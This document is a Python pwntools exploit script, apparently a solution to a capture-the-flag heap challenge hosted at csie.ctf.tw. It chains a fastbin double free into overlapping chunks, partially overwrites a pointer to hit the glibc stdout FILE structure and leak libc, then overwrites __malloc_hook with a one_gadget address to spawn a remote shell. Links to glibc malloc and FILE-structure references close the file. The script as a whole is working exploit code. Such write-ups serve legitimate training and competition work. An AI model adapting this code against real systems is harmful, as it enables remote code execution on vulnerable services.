from pwn import *

def create(size,content):
    r.sendlineafter('Choice:','1')
    r.sendlineafter('Size :',str(size))
    r.sendafter('Data :',content)

def delete(idx):
    r.sendlineafter('Choice:','2')
    r.sendlineafter('Index :',str(idx))

def paradise():
    r.sendlineafter('Choice:','3')

def getlibc():
    msg = u64(r.recvuntil('*****')[0x20:0x28])
    return msg

###Usefule addr
_IO_2_1_stdout_offset = 0x3c4620
one_gadget_offset = 0xef6c4
malloc_hook_offset = 0x3c3b10


r = remote('csie.ctf.tw',10148)

###PREPARE OVERLAPPING CHUNK
create(0x68,p64(0)*6+p64(0x71))          #0
create(0x68,p64(0)*6+p64(0x31)+p64(0x31)+p64(0)*4+p64(0x21))                        #1                   ###BYPASS VARIOUS CHECKS
delete(0)
delete(1)
delete(0)
create(0x68,b'\x38')                        #2
create(0x68,b'\n')                        #3

###CONSOLIDATE TO GET UNSORTEDBIN_ADDR ONTO HEAP
paradise()

###CRAFT BLOCK WITH FD AT LEAKED UNSORTEDBIN_ADDR
delete(0)
delete(1)
delete(0)
create(0x68,b'\x40')                        #4
create(0x68,p64(0)*6+p64(0x31)+p64(0x31)+p64(0)*4+p64(0x21))            #5  ###BYPASS VARIOUS CHECKS

###GUESS STDOUT FILE STRUCT WITH 1/16 CHANCE
mblock = p64(0)*7+p64(0x71)+b'\xdd\x45'
create(0x68,mblock)                        #6
create(0x68,p64(0)*5+p64(0x71))      #7

###MODIFY STDOUT BUFFER ADDR
payload = b'\x00'*3+p64(0)*6+p64(0xfbad800)+p64(0)*3+b'\x20'
create(0x68,payload)                          #8

###GET LIBC_BASE
libc_base = getlibc()-_IO_2_1_stdout_offset
print(hex(libc_base))
malloc_hook_writer = malloc_hook_offset+libc_base-0x23
one_gadget_addr = one_gadget_offset+libc_base


###OVERWRITE MALLOC_HOOK
delete(7)
delete(0)
create(0x68,p64(0)*7+p64(0x71)+p64(malloc_hook_writer))     #9
create(0x68,b'\n')                        #10
payload = b'\x00'*3+p64(0)*2+p64(one_gadget_addr)
create(0x68,payload)                        #11

###DOUBLE FREE TO CALL MALLOC -> GET SHELL
delete(0)
delete(0)
r.interactive()



### Reference
#	https://sourceware.org/glibc/wiki/MallocInternals
#	https://stackoverflow.com/questions/16424349/where-to-find-struct-io-file
#	https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc-2.23.c
#	https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c
#	https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_malloc.c
#	https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf
#	https://gist.github.com/romanking98/0aa14dcd3efba91382d142cb459f9e02
#	https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc
#	https://github.com/Naetw/CTF-pwn-tips
